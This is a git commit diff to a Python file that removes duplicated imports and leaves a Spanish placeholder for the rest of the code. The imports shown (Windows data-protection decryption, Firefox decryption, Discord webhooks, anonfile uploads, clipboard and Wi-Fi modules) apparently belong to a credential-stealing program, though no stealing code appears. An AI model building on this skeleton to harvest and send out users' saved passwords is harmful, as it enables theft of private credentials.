e30cd87d2ca714b4c0ee52ed3789a0bbaffdf036
matiasb186 <86837307+matiasb186@users.noreply.github.com>
2023-10-23 20:48:03 -0500

    Update all.py

--- all.py
+++ all.py
@@ -18,7 +18,6 @@ import glob
 import FireFoxDecrypt
 import requests
 import sys
-import base64
 from base64 import b64decode
 from json import loads
 from regex import findall
@@ -27,9 +26,7 @@ import time
 from pathlib import Path
 import codecs
 import json
-import base64
 from addict import Dict
-import win32crypt
 from Crypto.Cipher import AES
 from datetime import timezone, datetime, timedelta
 import winreg as reg
@@ -39,67 +36,12 @@ from anonfile import AnonFile
 import getpass
 import zipfile
 import win32clipboard
-import base64
-import json
-import os
-import shutil
-import sqlite3
-from datetime import datetime, timedelta
-
-from Crypto.Cipher import AES
-from win32crypt import CryptUnprotectData
-
-import os
-from datetime import datetime, timedelta
-from os import getenv, getlogin, listdir, walk
-import sqlite3
-from discord_webhook import DiscordWebhook, DiscordEmbed
-import discord
-import win32crypt
-import shutil
-import command
-import random
-import threading
-import re
-import wmi
-import uuid
-import textwrap
-import psutil
-import glob
-import FireFoxDecrypt
-import requests
-import sys
-import base64
-from base64 import b64decode
-from json import loads
-from regex import findall
-import platform
-import time
-import subprocess
-from pathlib import Path
-import codecs
-import json
-import base64
-from addict import Dict
-import win32crypt
-from Crypto.Cipher import AES
-from datetime import timezone, datetime, timedelta
-import winreg as reg
-from urllib.request import Request, urlopen
-import winreg
-from anonfile import AnonFile
-import getpass
-import zipfile
-import win32clipboard
-import base64
 import pywifi
-import json
 import os
-import shutil
-import sqlite3
-from datetime import datetime, timedelta
-from Crypto.Cipher import AES
-from win32crypt import CryptUnprotectData
+import subprocess
+
+# Aquí va el resto de tu código
+
 
 #SOURCES
 
